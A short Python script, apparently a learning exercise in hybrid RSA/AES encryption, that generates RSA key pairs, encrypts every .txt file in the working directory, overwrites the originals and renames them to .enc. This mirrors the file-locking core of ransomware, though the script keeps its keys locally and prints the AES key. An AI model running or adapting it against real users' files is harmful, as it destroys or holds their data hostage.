from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import glob
from pathlib import Path
import re

#RSA public and private key generation
key = RSA.generate(2048)
#Exporting the private key
private_key = key.export_key()
file_out = open("private.pem","wb")
file_out.write(private_key)
file_out.close()
#Exporting public key
public_key = key.publickey().export_key()
file_out = open("receiver.pem", "wb")
file_out.write(public_key)
file_out.close()

#Creating a second public and private key pair
secondkey = RSA.generate(2048)
private_key2 = secondkey.export_key()
secondfile_out = open("2ndprivate.pem","wb")
secondfile_out.write(private_key2)
secondfile_out.close()
public_key2 = secondkey.publickey().export_key()
secondfile_out = open("2ndreceiver.pem", "wb")
secondfile_out.write(public_key2)
secondfile_out.close()

#Generating the symmetric key
k = get_random_bytes(16)
#Reading the public key from receiver.pem
pk = RSA.import_key(open("receiver.pem").read())
file_out = open("CK.bin", "wb")
#Using PKCS#1_OAEP for encryption and decryption
cipher_rsa = PKCS1_OAEP.new(pk)
#Encrypting the key using RSA algorithm
Ck = cipher_rsa.encrypt(k)
file_out.write(Ck)
file_out.close()

#Decoding the key so that it can be printed out for later
kkeyy = b64encode(k).decode('utf-8')

#Finding and reading all .txt files
for filename in glob.glob('*.txt'):
	with open(filename) as f_input:
		#Using AES encrytion, Intializing AES encryption with CBC
		cipher = AES.new(k,AES.MODE_CBC)
		#Encoding the cipher.vi
		iv = b64encode(cipher.iv).decode('utf-8')
		#Reading the txt files
		ff_input = f_input.readlines()
		str_input = str(ff_input)
		print(str_input)
		#Removing the brackets and checking for \n in text files
		if str_input.find('\\n')!=-1:
			str2_input = str_input[2:-4]
		else:
			str2_input = str_input[2:-2]
		print(str2_input)
		#Converting string output to bytes
		M = bytes (str2_input,'utf-8')
		#Padding data
		CM_bytes = cipher.encrypt(pad(M,AES.block_size))
		#Encoding CM bytes
		CM = b64encode(CM_bytes).decode('utf-8')
		print('Message: '+str(M))
		print('CM: '+CM)
		print('iv: ' +iv)
		print('\n')
		#Writing Crypted message in the same file and changing file extension
		Fileout = open(filename, 'w')
		Fileout.writelines(str(CM) + "\n")
		Fileout.writelines(str(iv))
		Fileout.close()
		p = Path(filename)
		p.rename(p.with_suffix('.enc'))

#Printing the key used
print('k :' + kkeyy)




